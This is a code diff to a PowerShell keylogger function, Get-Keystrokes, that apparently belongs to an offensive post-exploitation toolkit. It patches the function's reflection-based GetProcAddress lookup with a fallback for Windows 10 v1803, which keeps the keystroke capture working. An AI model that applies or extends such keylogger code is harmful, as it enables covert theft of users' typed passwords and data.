@@ -107,16 +107,25 @@ function Get-Keystrokes {
                 Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
             $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
             # Get a reference to the GetModuleHandle and GetProcAddress methods
-            $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
-            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
-            # Get a handle to the module specified
-            $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
-            $tmpPtr = New-Object IntPtr
-            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
-        
-            # Return the address of the function
-            $GetProcAddress.Invoke($null, @([Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
-        }
+
+		$GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
+		$GetProcAddress = $UnsafeNativeMethods.GetMethods() | Where {$_.Name -eq "GetProcAddress"} | Select-Object -first 1
+
+		# Get a handle to the module specified
+		$Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
+
+		# Return the address of the function
+		try
+		{
+			$tmpPtr = New-Object IntPtr
+			$HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
+			$GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
+		}
+		catch
+		{
+			# Windows 10 v1803 needs $Kern32Handle as a System.IntPtr instead of System.Runtime.InteropServices.HandleRef
+			$GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
+		}
 
         #region Imports
 
